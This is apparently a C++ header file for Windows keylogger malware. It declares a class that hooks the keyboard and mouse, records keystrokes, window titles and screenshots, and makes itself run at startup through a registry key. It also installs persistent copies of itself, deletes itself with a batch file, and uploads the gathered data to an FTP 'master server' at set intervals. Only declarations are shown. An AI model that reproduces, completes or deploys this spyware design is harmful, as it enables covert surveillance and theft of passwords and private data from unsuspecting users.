#ifndef H_KEYLOGGER
#define H_KEYLOGGER

//will activate FTP upload functionality, which needs SFML. Comment out for a full standalone version without FTP upload
#define USE_FTP

#define _WIN32_WINNT 0x0501

#ifdef USE_FTP
#define SFML_STATIC
#endif

#include <windows.h>
#include <iostream>
#include <ctime>
#include <fstream>
#include <string>
#include <sstream>

#ifdef USE_FTP
#include <SFML/Network.hpp>
#endif

#include "screenshot.h"

//registry key name
#define REGKEY_NAME "keylogger"

//keyboard scan codes
#define SC_CTRL 29
#define SC_LSHIFT 42
#define SC_ALT 56
#define SC_RSHIFT 54
#define SC_SPACE 57
#define SC_ENTER 28
#define SC_TAB 15
#define SC_BACKSPACE 14
#define SC_CAPSLOCK 58
#define SC_ESCAPE 1

//key to press in order to destroy the keylogger
#define HOTKEY_PURGE NULL

//data folder name
#define DATADIR "gathered"

//time interval between server uploads
#define UPLOAD_DELTA 10

//name of the batch file used for deleting the program
#define BATCH_NAME "cleaner.bat"

//name of the file receiving key strokes
#define KEYSTROKES_FILE "keystrokes.txt"

class KeyLogger {

    public:

    //singleton
    static KeyLogger* getInstance();
    static void releaseInstance();

    //starts listenning
    void listen();
    
    //makes the program launch at startup
    void persist(std::string path = "");

    //erases program data
    void purge();

    //loop for standalone usage
    void loop();

    //installs a persistent copy
    void install(std::string target);
    
    //get user home directory
    std::string getUserHomeDirectory();

    //ALT state
    bool KeyLogger::isAltDown() { return altDown; }
    void KeyLogger::setAltDown(bool down) { altDown = down; }

    //CTRL state
    bool KeyLogger::isCtrlDown() { return ctrlDown; }
    void KeyLogger::setCtrlDown(bool down) { ctrlDown = down; }

    //LEFT SHIFT state
    bool KeyLogger::isLShiftDown() { return lshiftDown; }
    void KeyLogger::setLShiftDown(bool down) { lshiftDown = down; }
    
    //RIGHT SHIFT state
    bool KeyLogger::isRShiftDown() { return rshiftDown; }
    void KeyLogger::setRShiftDown(bool down) { rshiftDown = down; }

    //setup FTP master server
    void setMaster(std::string server, int port, std::string login, std::string password, std::string _uploadDir=".");

    protected:

    KeyLogger();
    ~KeyLogger();

    void log(std::string text);

    void removeSelf();

    void freeResources();

    std::string getTimeString();

    std::string screenshot();

    std::string getActiveWindowTitle();

    std::string removeFilespec(std::string path);

    void writeBuffer();

    void upload();

    static LRESULT hookFunction(int nCode, WPARAM wParam, LPARAM lParam);

    static KeyLogger* instance;

    bool altDown;
    bool ctrlDown;
    bool lshiftDown;
    bool rshiftDown;

    HHOOK khook, mhook;
    
    std::ofstream logFile;

    std::string programDir;
    std::string programPath;
    std::string programName;

    std::string keyboardBuffer;

    std::string activeWindowTitle;

    time_t lastUpload;

    #ifdef USE_FTP
    sf::Ftp ftpClient;
    #endif
    bool useFTP;
    std::string uploadDir;
};

#endif // H_KEYLOGGER
